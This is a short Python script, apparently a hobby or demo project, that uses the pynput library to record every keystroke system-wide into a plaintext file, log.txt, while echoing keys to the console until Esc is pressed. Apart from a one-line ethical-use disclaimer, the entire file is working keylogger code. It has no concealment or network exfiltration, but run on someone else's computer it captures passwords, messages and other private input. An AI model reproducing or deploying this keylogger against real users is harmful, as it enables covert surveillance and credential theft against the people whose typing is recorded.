from pynput import keyboard
import os

"""
DISCLAIMER:
    - This program is intented to be used for ethical and legal purposes only.
    - Illegal or unethical use of this software is prohibited.
"""

def on_press(key, injected):
    try:
        print(f"key pressed: {key}")
        if key == keyboard.Key.space:
            open('log.txt', 'a').write(" ")
        
        elif key == keyboard.Key.shift:
            pass
        
        elif key == keyboard.Key.enter:
            open('log.txt', 'a').write(" " + "Enter Pressed\n")
        
        else:
            open('log.txt', 'a').write(f"{str(key)}")
    except Exception as e:
        print(f"Error: {e}")
        
def on_release(key, injected):
    try:
        print(f"Key released: {key}")
        
        if key == keyboard.Key.esc:
            return False
    
    except Exception as e:
        print(f"Error: {e}")

def main():
    
    open('log.txt', 'w').write(
        "Logfile\n"
    )
    
    try:
        with keyboard.Listener(
            on_press=on_press,
            on_release=on_release
        ) as listener:
            listener.join()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()